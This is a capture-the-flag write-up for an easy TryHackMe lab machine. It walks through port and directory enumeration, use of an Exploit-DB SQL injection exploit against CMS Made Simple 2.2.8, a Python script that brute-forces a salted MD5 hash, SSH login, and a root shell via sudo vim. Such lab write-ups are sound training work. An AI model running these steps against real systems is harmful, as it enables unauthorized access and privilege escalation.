## Info
- Platform: TryHackMe  
- Difficulty: Easy

---

## Enumeration

### Nmap
<img width="1919" height="876" alt="image" src="https://github.com/user-attachments/assets/0572d67d-13de-4787-880a-d2587707efde" />

- Open ports: 21 (FTP), 80 (HTTP), 2222 (SSH).

---

### Gobuster
```bash
gobuster dir -u http://10.10.181.13 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.13
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403)
/index.html           (Status: 200)
/robots.txt           (Status: 200)
/server-status        (Status: 403)
/simple               (Status: 301) [--> http://10.10.181.13/simple/]
Progress: 18452 / 18452 (100.00%)

===============================================================
Finished
===============================================================
```
- `/simple` directory discovered.

## Exploitation

### CMS identification
<img width="349" height="68" alt="image" src="https://github.com/user-attachments/assets/9d94672b-623b-4977-be7e-c54c29e8f96e" />

- Found CMS Made Simple version 2.2.8

---

### Exploit-DB 46635
<img width="1919" height="239" alt="image" src="https://github.com/user-attachments/assets/259a0443-725d-4ec9-883b-896bbb9bd190" />

```bash
python2 46635.py -u http://10.10.181.13/simple/
```
Output returned:

<img width="634" height="140" alt="image" src="https://github.com/user-attachments/assets/12e3d3da-d30e-4212-97af-61c829eda75d" />

---

### Cracking the hash

- Hash: 0c01f4468bd75d7a84c7eb73846e8d96
- Salt: 1dac0d92e9fa6bb2

- I used a simple Python brute-force over `rockyou.txt.`
```bash
# crack.py
import hashlib

salt = "1dac0d92e9fa6bb2"
target = "0c01f4468bd75d7a84c7eb73846e8d96"

with open("/usr/share/wordlists/rockyou.txt","rb") as f:
    for w in f:
        pw = w.strip()
        if hashlib.md5(salt.encode()+pw).hexdigest() == target:
            print("[+] Password found:", pw.decode(errors='ignore'))
            break
```
- Result: secret

---

## Access

### SSH Login
<img width="1243" height="516" alt="image" src="https://github.com/user-attachments/assets/71600437-106b-434d-8a4c-05e87a62e090" />

<img width="543" height="152" alt="2" src="https://github.com/user-attachments/assets/bf978eab-9d36-4554-90ab-0129f78f7aa9" />

- First flag found: `[FLAG FOUND]`

---

## Privilege Escalation

## Sudo enumeration
```bash
sudo -l
```
- `mitch` can run `/usr/bin/vim` as root (NOPASSWD).

```bash
sudo vim -c ':!/bin/sh'
whoami
# root
```

<img width="347" height="122" alt="2" src="https://github.com/user-attachments/assets/8bd3e52e-3b94-4cf0-afe8-0f0700246f59" />

- Second flag found: `[FLAG FOUND]`
